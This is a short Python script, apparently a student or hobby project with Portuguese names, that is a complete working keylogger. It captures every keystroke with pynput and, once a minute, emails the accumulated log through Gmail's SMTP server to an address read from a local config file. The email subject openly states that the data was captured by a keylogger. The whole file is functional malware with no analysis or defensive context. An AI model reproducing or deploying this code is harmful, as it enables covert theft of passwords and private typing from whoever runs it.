import configparser
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

config = configparser.ConfigParser()
config.read(".properties")

EMAIL_ORIGEM = config["acessos"]["EMAIL_ORIGEM"]
EMAIL_DESTINO = config["acessos"]["EMAIL_DESTINO"]
SENHA_EMAIL = config["acessos"]["SENHA_EMAIL"]
log = ""
def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
        
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print(f"Erro ao enviar {e}")
        log = ""
    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log+= key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[<]"
        else:
            pass

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()